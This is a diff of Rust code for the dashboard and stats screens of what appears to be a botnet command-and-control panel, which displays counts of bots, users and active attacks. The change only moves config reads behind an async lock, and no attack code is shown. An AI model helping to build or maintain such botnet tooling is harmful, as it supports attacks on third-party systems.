@@ -10,7 +10,7 @@ pub async fn render_status_bar(client: &Arc<Client>, state: &Arc<AppState>) -> R
     let bot_count = state.bot_manager.get_bot_count().await;
     let client_count = state.client_manager.get_client_count().await;
     let attack_count = state.attack_manager.get_active_count().await;
-    let max_attacks = state.config.max_attacks;
+    let max_attacks = state.config.read().await.max_attacks;
     
     let uptime = state.started_at.elapsed();
     let days = uptime.as_secs() / 86400;
@@ -123,9 +123,9 @@ pub async fn handle_stats_command(client: &Arc<Client>, state: &Arc<AppState>) -
     let client_pad = main_width - visible_len(&format!("Users Connected: {}", client_count)) - 2;
     client.write(format!("{}{}{}║                              ║\n\r", client_line, " ".repeat(client_pad), " ").as_bytes()).await?;
     
-    let attack_gradient = apply_gradient(&format!("{}/{}", attack_count, state.config.max_attacks), 39, 51);
+    let attack_gradient = apply_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks), 39, 51);
     let attack_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mActive Attacks: {}\x1b[38;5;240m", attack_gradient);
-    let attack_pad = main_width - visible_len(&format!("Active Attacks: {}/{}", attack_count, state.config.max_attacks)) - 2;
+    let attack_pad = main_width - visible_len(&format!("Active Attacks: {}/{}", attack_count, state.config.read().await.max_attacks)) - 2;
     client.write(format!("{}{}{}║                              ║\n\r", attack_line, " ".repeat(attack_pad), " ").as_bytes()).await?;
     
     client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
@@ -570,8 +570,8 @@ pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState
     let uptime_pad = col1_width - visible_len(&format!("Uptime: {}d {}h {}m", days, hours, minutes)) - 1;
     
     let bots_label = apply_gradient("Bots:", 245, 250);
-    let bots_line_content = format!("{} {}\x1b[38;5;240m/\x1b[38;5;245m{}", bots_label, bot_gradient, state.config.max_bot_connections);
-    let bots_pad = col2_width - visible_len(&format!("Bots: {}/{}", bot_count, state.config.max_bot_connections)) - 1;
+    let bots_line_content = format!("{} {}\x1b[38;5;240m/\x1b[38;5;245m{}", bots_label, bot_gradient, state.config.read().await.max_bot_connections);
+    let bots_pad = col2_width - visible_len(&format!("Bots: {}/{}", bot_count, state.config.read().await.max_bot_connections)) - 1;
     
     let uptime_line = format!("\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ ╔══════════════════════════╗ ║", 
         uptime_line_content, " ".repeat(uptime_pad.max(0)), " ",
@@ -585,8 +585,8 @@ pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState
     let status_pad = col1_width - visible_len(&format!("Status: {}", status)) - 2;
     
     let users_label = apply_gradient("Users:", 245, 250);
-    let users_line_content = format!("{} {}\x1b[38;5;240m/\x1b[38;5;245m{}", users_label, client_gradient, state.config.max_user_connections);
-    let users_pad = col2_width - visible_len(&format!("Users: {}/{}", client_count, state.config.max_user_connections)) - 2;
+    let users_line_content = format!("{} {}\x1b[38;5;240m/\x1b[38;5;245m{}", users_label, client_gradient, state.config.read().await.max_user_connections);
+    let users_pad = col2_width - visible_len(&format!("Users: {}/{}", client_count, state.config.read().await.max_user_connections)) - 2;
     
     let status_line = format!("\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ ║      SERVER  STATS       ║ ║", 
         status_line_content, " ".repeat(status_pad.max(0)), " ",
@@ -607,8 +607,8 @@ pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState
     let level_pad = col1_width - visible_len(&format!("Level: {}", client.user.get_level().to_str())) - 1;
     
     let attacks_label = apply_gradient("Attacks:", 245, 250);
-    let attacks_line_content = format!("{} {}\x1b[38;5;240m/\x1b[38;5;245m{}", attacks_label, attack_gradient, state.config.max_attacks);
-    let attacks_pad = col2_width - visible_len(&format!("Attacks: {}/{}", attack_count, state.config.max_attacks)) - 1;
+    let attacks_line_content = format!("{} {}\x1b[38;5;240m/\x1b[38;5;245m{}", attacks_label, attack_gradient, state.config.read().await.max_attacks);
+    let attacks_pad = col2_width - visible_len(&format!("Attacks: {}/{}", attack_count, state.config.read().await.max_attacks)) - 1;
     
     let attacks_line = format!("\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ ║  ┌──────────────────┐    ║ ║", 
         level_line_content, " ".repeat(level_pad.max(0)), " ",
